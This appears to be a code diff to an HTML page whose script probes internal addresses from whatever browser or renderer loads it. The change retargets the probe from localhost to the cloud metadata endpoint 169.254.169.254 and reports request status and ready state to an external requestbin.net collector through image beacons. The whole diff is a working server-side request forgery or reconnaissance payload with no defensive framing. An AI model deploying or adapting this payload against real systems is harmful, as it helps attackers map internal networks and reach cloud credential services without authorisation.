@@ -6,12 +6,14 @@
   </head>
   <body>
     <script>
-    let LOG_URL = "http://requestbin.net/r/380yyurc";
+    let LOG_URL = "http://requestbin.net/r/fnvhy2pn";
+    let LOCAL_HOST = "http://169.254.169.254/";
+      
     let img = new Image();
     img.src = LOG_URL + "?START";
 
     let req = new XMLHttpRequest();
-    req.open('GET', "http://localhost", false);
+    req.open('GET', LOCAL_HOST, false);
     //req.withCredentials = true;
     req.onreadystatechange = function (aEvt)
     {
@@ -21,6 +23,10 @@
           img.src = LOG_URL + "?CODE=200";
          else
           img.src = LOG_URL + "?CODE="+req.status;
+      }
+      else
+      {
+        img.src = LOG_URL + "?STATE="+req.readyState;
       }
     };
     req.send();
